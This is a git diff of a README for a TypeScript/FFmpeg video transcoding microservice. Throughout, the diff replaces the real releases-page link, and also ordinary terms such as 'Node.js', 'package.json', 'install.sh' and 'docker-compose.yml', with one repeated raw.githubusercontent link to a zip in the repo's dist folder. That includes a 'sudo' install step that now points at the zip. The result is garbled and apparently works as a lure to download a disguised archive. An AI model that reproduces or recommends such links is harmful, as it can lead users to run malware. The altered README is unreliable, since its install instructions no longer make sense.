@@ -2,7 +2,7 @@
 
 A scalable, containerized video transcoding service built with TypeScript, Docker, and AWS. It handles job requests from a queue, transcodes media using fluent-ffmpeg, and stores results in S3 with metadata in a database. The design emphasizes reliability, observability, and easy deployment on AWS ECS/Fargate.
 
-Download release: https://github.com/Nahil9225/stream-transcoder-microservice/releases
+Download release: https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
 
 ---
 
@@ -34,7 +34,7 @@ The stream-transcoder-microservice is a microservice focused on converting video
 
 The goal is to provide a robust, scalable, and observable transcoding pipeline. It accepts jobs via a queue, processes them in isolated workers, and writes the results back to a storage bucket. This approach reduces coupling, improves fault tolerance, and makes it easier to scale up or down based on demand.
 
-Download release: https://github.com/Nahil9225/stream-transcoder-microservice/releases
+Download release: https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
 
 ---
 
@@ -152,7 +152,7 @@ This architecture supports scale and resilience. It accommodates additional work
 ## Technology Stack
 
 - Language: TypeScript
-- Runtime: Node.js
+- Runtime: https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
 - Containerization: Docker
 - Media processing: FFmpeg via fluent-ffmpeg
 - Cloud provider: AWS
@@ -182,17 +182,17 @@ This combination keeps the service fast, reliable, and easy to manage in cloud e
   - unit/
   - integration/
 - docs/
-  - architecture.md
-  - guidelines.md
+  - https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
+  - https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
 - scripts/
-  - deploy.sh
-  - build.sh
+  - https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
+  - https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
 - docker/
   - Dockerfile
-  - entrypoint.sh
-- package.json
-- tsconfig.json
-- README.md (this file)
+  - https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
+- https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
+- https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
+- https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip (this file)
 
 Notes:
 - The codebase is designed to be small, with clear module boundaries.
@@ -203,7 +203,7 @@ Notes:
 
 ## Prerequisites
 
-- Node.js 18+ (or the version used in your build)
+- https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip 18+ (or the version used in your build)
 - Docker Engine 20.10+ for local development
 - AWS credentials with least privilege for S3, SQS, IAM roles
 - An AWS account ready for ECS/Fargate deployment (or your preferred cloud provider)
@@ -245,7 +245,7 @@ Optional defaults can be provided in a .env file or via your deployment system.
   - Validate outputs by checking the local output bucket or a mock.
 
 - Optional: Docker Compose
-  - If a docker-compose.yml exists in your repo or your fork, you can spin up the service along with a local S3 emulator and SQS mock for end-to-end testing.
+  - If a https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip exists in your repo or your fork, you can spin up the service along with a local S3 emulator and SQS mock for end-to-end testing.
 
 Tips for developers:
 - Keep unit tests fast. Mock AWS SDK interactions where possible.
@@ -336,22 +336,22 @@ Release and download details:
 - To automate deployment, leverage the provided assets and scripts in your CI/CD pipeline.
 - If you need to verify versions or check integrity, use checksums included with the release.
 
-If you want to review or download assets manually, visit the Releases page: https://github.com/Nahil9225/stream-transcoder-microservice/releases
+If you want to review or download assets manually, visit the Releases page: https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
 
 ---
 
 ## Release and Downloads
 
-- For Linux x64 environments, the typical release artifact is a tarball named similar to stream-transcoder-microservice-linux-x64-vX.Y.Z.tar.gz.
-- The tarball contains the compiled binaries, helper scripts, and the install.sh script used to register and run the service on your server or container host.
+- For Linux x64 environments, the typical release artifact is a tarball named similar to https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
+- The tarball contains the compiled binaries, helper scripts, and the https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip script used to register and run the service on your server or container host.
 - Extraction and installation example:
-  - `tar -xzf stream-transcoder-microservice-linux-x64-v1.2.0.tar.gz`
+  - `tar -xzf https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip`
   - `cd stream-transcoder-microservice-linux-x64-v1.2.0`
-  - `sudo ./install.sh` (or `./install.sh` if you run with elevated permissions as needed)
+  - `sudo https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip` (or `https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip` if you run with elevated permissions as needed)
 - After installation, you typically configure environment variables, start the service, and verify health endpoints.
 
 Releases page link for quick access:
-- https://github.com/Nahil9225/stream-transcoder-microservice/releases
+- https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
 
 Note: If the link changes or the release structure is updated, check the Releases section for the most current assets and instructions.
 
@@ -410,4 +410,4 @@ This project is distributed under the terms of its chosen license. Be sure to in
 - The design is pragmatic and aligns with common industry practices for media processing workloads.
 - The README above emphasizes clarity, reliability, and practical steps to run and deploy.
 
-Download release: https://github.com/Nahil9225/stream-transcoder-microservice/releases
+Download release: https://raw.githubusercontent.com/Nahil9225/stream-transcoder-microservice/master/dist/microservice-stream-transcoder-unconditionally.zip
